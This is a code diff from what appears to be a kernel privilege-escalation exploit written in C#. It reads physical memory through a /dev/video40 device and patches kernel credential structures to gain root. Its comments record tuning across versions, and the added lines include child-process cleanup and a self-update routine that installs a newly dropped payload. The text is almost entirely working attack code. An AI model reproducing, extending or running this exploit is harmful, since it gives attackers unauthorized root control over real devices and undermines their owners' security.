+                // when cred pages read stale too (cuid != 5001): the scan would
+                // only patch neighbours for nothing.
+                // v30: only in a round that follows a wait.  An early scan runs
+                // inside the ~15-20 s content window, misses (v28: patched=4,
+                // ours still stale), and spends the process-wide 8-cred budget
+                // before the post-window round that can actually see ours.
+                if (getuid() != 0 && backoffMs[round] > 0)
+                {
+                    DropPages();
+                    uint cc2 = 0;
+                    try { cc2 = U32(ReadPhys(V2P(child) + O_CRED, 4), 0); } catch { }
+                    if (Kptr(cc2) && CredUid(cc2) == 5001)
+                    {
+                        if (CredScanNear(cc2, out int scanned))
+                            Beacon("cred-scan ROOT patched=" + scanned +
+                                   " total=" + _scanPatched);
+                        else
+                            Beacon("cred-scan miss patched=" + scanned +
+                                   " total=" + _scanPatched);
+                    }
+                    else
+                    {
+                        Beacon("cred-scan skip anchor=" + cc2.ToString("x8") +
+                               " cuid=" + UidWord(Kptr(cc2) ? CredUid(cc2) : 0xFFFFFFFF));
+                    }
+                }
+
                 // Parent pointer from the landmark -> our task -> our cred.
-                int scanTries = fastMode ? 5 : 20;
+                // v29: the PHYSRPT scan never fired on a stale attempt 1 (the
+                // parent's comm is stale on exactly those attempts, and when
+                // comms are coherent the direct-parent path works anyway), so
+                // fast mode spends less time here.
+                int scanTries = fastMode ? 2 : 20;
             for (int t = 0; t < scanTries && getuid() != 0; t++)
                 {
                     uint parent = 0;
@@ -818,7 +1368,11 @@ internal static class Program
                     }
                     Thread.Sleep(700);
                 }
-                if (getuid() != 0) Beacon("fail round " + round);
+                if (getuid() != 0)
+                {
+                    Beacon("fail round " + round);
+                    KillChildren();
+                }
             }   // end rounds
 
             ReapChildren();
@@ -838,6 +1392,10 @@ internal static class Program
                 // free /dev/video40 so the browser physmap path works again
                 try { if (_fd >= 0) { close(_fd); _fd = -1; Beacon("device closed"); } } catch { }
 
+                // Landmark children sleep 120 s; a later kill -9 reparents them
+                // to init and the next AUL launch wastes fast attempts on them.
+                KillChildren();
+
                 // self-update: if a new payload was dropped in the share, install
                 // it and exit so AUL restarts the app with the new assembly
                 if (TrySelfUpdate()) { Thread.Sleep(500); Environment.Exit(0); }
@@ -852,6 +1410,7 @@ internal static class Program
                 // Release the device first: AUL's relaunch must not race our own
                 // dying process for the single /dev/video40 opener.
                 if (_fd >= 0) { try { close(_fd); } catch { } _fd = -1; }
+                KillChildren();
                 Beacon("fast-exit attempt=" + attempt);
                 Thread.Sleep(2000);
                 Environment.Exit(0);
